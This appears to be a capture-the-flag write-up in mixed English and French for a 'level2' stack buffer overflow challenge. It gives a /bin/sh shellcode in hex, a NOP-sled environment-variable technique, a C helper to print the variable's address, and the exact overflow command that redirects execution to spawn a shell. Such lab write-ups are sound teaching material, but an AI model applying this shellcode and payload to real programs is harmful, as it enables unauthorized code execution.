How to calculate the size of the buffer (number of character we need ti fill before writing over eip) : 

We take the beginning of the buffer, it is located in eax register right after the call to `gets` function. We put a break point in the instruction next to that call, and we print information about eax register :


The shellcode to "/bin/sh" is : `"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"`

<!-- We put 200 'nop' instructions before the shellcode :
export SHELLCODE=`python -c 'print("\x90"*200+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")'` -->

(after setting a breakpoint and running the program) How to find the address of the envirnment variable :
`x/20s *environ`

<!-- This is a program in C to print the address of the environment variable : 
`cat /tmp/print_env.c `
```
#include <stdio.h>

int main(int argc, char**argv)
{
	printf("%p\n", getenv("SHELLCODE"));
	return (1);
}
```
Compilate : `gcc -o /tmp/print_env /tmp/print_env.c` -->


The address of the environment variable is `0xbffff8d2`

The address of ret (from p function) is `0x0804853e`(Actually we could take the adress of the eip of p function when we put a breakpoint in ret, but we didn't do that).

<!-- cat /tmp/test - | ./level2 -->

<!-- La technique pour essayer de mettre le shellcode directement dans le buffer (avec un autre shellcode de 17 bytes) : `python -c 'print "\x90" * 63 + "\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x3e\x85\x04\x08" + "\xec\xf5\xff\xbf"' > /tmp/test` (ne marche pas, erreur floating point blablabal) -->

La commande qui nous permet d'ouvrir le shell :  (python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\xd2\xf8\xff\xbf"' ; cat) | ./level2 --> 80 char pour overflow le buffer + l'adresse du ret + l'adresse du shellcode + cat pour empecher le shell de se fermer

# Sources :

Where to find the shellcode :
- https://beta.hackndo.com/buffer-overflow/#pratique
